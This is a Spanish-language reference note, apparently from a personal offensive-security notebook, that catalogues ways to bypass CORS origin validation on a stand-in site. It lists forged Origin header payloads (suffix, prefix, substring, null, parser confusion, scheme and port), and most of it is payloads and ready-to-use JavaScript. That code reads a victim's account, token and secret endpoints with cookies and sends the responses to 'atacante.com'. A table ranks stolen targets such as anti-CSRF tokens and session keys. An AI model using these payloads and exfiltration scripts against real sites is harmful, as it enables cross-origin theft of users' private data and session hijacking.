---
tipo: meta
aliases:
  - CORS payloads
  - bypass de origen
  - Access-Control-Allow-Origin
tags:
  - meta/referencia
  - dominio/web
---

# CORS bypass de origen - matriz de referencia

> [!info] Referencia pura, no un zettel
> Los `Origin` que vencen cada tipo de validación, y cómo leer la respuesta. El criterio está en las tres notas de `600-tradecraft/`; el modelo, en [[MOC - CORS]].

Dominio legítimo supuesto: `objetivo.com`. Origen del atacante: `atacante.com`.

## 0. Las tres cabeceras que hay que leer

```sh
curl -s -I https://objetivo.com/api/cuenta -H "Origin: https://atacante.com" | grep -i '^access-control'
```

| Cabecera en la respuesta | Qué significa |
|---|---|
| `Access-Control-Allow-Origin: https://atacante.com` | **Refleja.** El origen inventado se autorizó |
| `Access-Control-Allow-Origin: *` | Comodín. Seguro salvo que devuelva datos privados sin credenciales |
| `Access-Control-Allow-Credentials: true` | El agravante. Sin esto solo se lee lo público |
| sin cabecera de origen | No refleja. Probar variantes de cadena |

**El comodín `*` no se puede combinar con credenciales**: el navegador lo prohíbe. Si aparecen los dos, el navegador ignora la respuesta — la vulnerabilidad seria es siempre un origen **específico** reflejado con credenciales.

## 1. Reflejo directo

`Origin: https://atacante.com`
`Origin: http://atacante.com`
`Origin: https://cualquier-cosa.com`

Si se refleja tal cual, la validación no existe. Es la prueba de [[CORS - reflejo del origen con credenciales]] y cierra el dominio en una petición cuando funciona.

## 2. Sufijo

Contra `endsWith("objetivo.com")`:

`Origin: https://atacanteobjetivo.com`
`Origin: https://notobjetivo.com`

Explotable: `atacanteobjetivo.com` es un dominio libre que se registra. Es el bypass de cadena más práctico porque no depende de controlar nada bajo el dominio real.

## 3. Prefijo

Contra `startsWith("https://objetivo.com")`:

`Origin: https://objetivo.com.atacante.com`
`Origin: https://objetivo.com.evil.net`

Necesita un subdominio del atacante, que es trivial. Ojo: algunos servidores anclan con la barra —`https://objetivo.com/`— y ahí esta variante falla.

## 4. Subcadena

Contra `contains("objetivo.com")`:

`Origin: https://atacante.com?objetivo.com`
`Origin: https://objetivo.com.atacante.com`
`Origin: https://atacante-objetivo.com`
`Origin: https://objetivocom.atacante.com`

## 5. `null`

`Origin: null`

Si se refleja, va [[CORS - null y comodín de subdominio]]. Contextos que producen `Origin: null` en el navegador:

| Contexto | Cómo |
|---|---|
| `iframe` con `sandbox` | `sandbox="allow-scripts"` sin `allow-same-origin` |
| Documento `data:` | `<iframe src="data:text/html,...">` |
| Redirección con esquema local | `file:` o similar en medio de la cadena |
| `srcdoc` con sandbox | Como el primero, sin alojar nada |

Prueba de concepto sin alojar nada:

```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
<script>
fetch('https://objetivo.com/api/cuenta',{credentials:'include'})
 .then(r=>r.text()).then(d=>location='https://atacante.com/x?'+encodeURIComponent(d))
</script>"></iframe>
```

## 6. Confusión del analizador

Cuando la validación parsea el origen y se le puede confundir el host — mismas construcciones que [[OAuth redirect_uri - matriz de referencia]] § 6:

`Origin: https://objetivo.com.atacante.com`
`Origin: https://objetivo.com\.atacante.com`
`Origin: https://objetivo.com%60.atacante.com`
`Origin: https://atacante.com\@objetivo.com`

Los caracteres especiales —`_`, backtick, barra invertida— a veces los tratan distinto el validador y el navegador. Rinde poco y cuesta una petición, así que se prueba al final.

## 7. Esquema y puerto

`Origin: http://objetivo.com` — bajar a HTTP si valida solo el host
`Origin: https://objetivo.com:1337` — puerto distinto si valida host sin puerto
`Origin: https://objetivo.com.` — punto final, un host distinto que a veces resuelve igual

## 8. Leer la respuesta

Confirmada la variante, la página del atacante es siempre la misma forma:

```js
fetch('https://objetivo.com/api/cuenta', {credentials:'include'})
  .then(r => r.text())
  .then(d => navigator.sendBeacon('https://atacante.com/x', d));
```

`credentials:'include'` es obligatorio o las cookies no viajan. `sendBeacon` sobrevive a que la víctima cierre la pestaña; `fetch` a `atacante.com` también sirve.

Si el dato interesante está detrás de una segunda petición —un token que después se usa—, se encadena:

```js
const t = await (await fetch('https://objetivo.com/api/token',{credentials:'include'})).json();
await fetch('https://objetivo.com/api/secreto',{credentials:'include',headers:{'X-Token':t.value}})
  .then(r=>r.text()).then(d=>fetch('https://atacante.com/x?'+encodeURIComponent(d)));
```

## 9. Qué se roba, en orden de valor

| Objetivo | Por qué |
|---|---|
| Token anti-CSRF | Con él se habilita el CSRF que CORS no da. Ver [[MOC - CSRF]] |
| Clave de API o token de sesión | Acceso directo reutilizable fuera del navegador |
| Datos personales del endpoint de cuenta | El hallazgo demostrable de fuga |
| Respuesta de un endpoint administrativo | Si la víctima es admin, escalada |

Robar el token anti-CSRF es la combinación que más rinde: CORS mal configurado **lee** el token, y con el token se puede **escribir** — los dos dominios encadenados hacen lo que ninguno solo.

## 10. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `ACAO` refleja pero sin `Allow-Credentials` | Solo se lee lo público. Hallazgo de baja severidad |
| `ACAO: *` y `Allow-Credentials: true` juntos | El navegador ignora la respuesta. No es explotable |
| No refleja nada | Probar variantes de cadena, § 2 a 4 |
| Refleja `null` | Va la rama de `iframe` sandbox, § 5 |
| El `fetch` no manda cookies | Falta `credentials:'include'` |
| El endpoint autentica por `Authorization` | El navegador no manda esa cabecera solo. Sin cookies no hay robo |
| El prefijo no funciona con barra | El servidor ancló con `/`. Probar sufijo |
| La respuesta llega vacía | El endpoint necesita la cookie y no viajó, o exige otra cabecera |

## Relacionadas

[[MOC - CORS]] · [[CORS - reflejo del origen con credenciales]] · [[OAuth redirect_uri - matriz de referencia]] · [[CSRF entrega - matriz de referencia]]
